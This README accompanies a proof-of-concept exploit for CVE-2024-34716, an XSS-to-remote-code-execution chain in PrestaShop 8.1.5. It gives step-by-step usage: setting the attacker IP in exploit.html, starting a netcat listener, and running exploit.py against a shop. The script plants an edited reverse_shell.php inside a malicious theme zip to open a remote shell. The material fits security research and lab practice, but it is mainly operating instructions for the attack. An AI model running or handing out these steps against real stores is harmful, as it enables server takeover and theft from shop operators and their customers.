# CVE-2024-34716_PoC


More technical details can be found on https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/


This version automates the editing of the reverse_shell.php file inside the 1337.zip theme file. Most people have been having trouble with this PoC exploit as some people unpack the theme, edit the shell, repack the theme, which changes file permissions and the exploit gives 403 Forbidden errors. 

Modify exploit.html:

`httpServerIp` should be your attacker-ip. 

`const path = 'put-the-admin-path-here';` Modify this to the correct path where PrestaShop can be found.


Start a netcat listener on whatever port you want, for example 1002

`nc -lvnp 1002`

Then run the exploit:

`python3 exploit.py http://shop.prestashop.tld/ 'registered_email@shop.prestashop.tld' 'Message Text' exploit.html YOUR_IP YOUR_PORT`


`python3 exploit.py http://shop.prestashop.tld/ 'hash@hash.com' 'pwn' exploit.html 10.10.14.88 1002`

The script will edit the reverse_shell.php file located in the current directory, and use the zip command with the -u flag to update the zip file with the modified shell.

![](https://gitlab.com/hashborgir/prestashop-cve-2024-34716/-/raw/main/PoC.png?ref_type=heads)
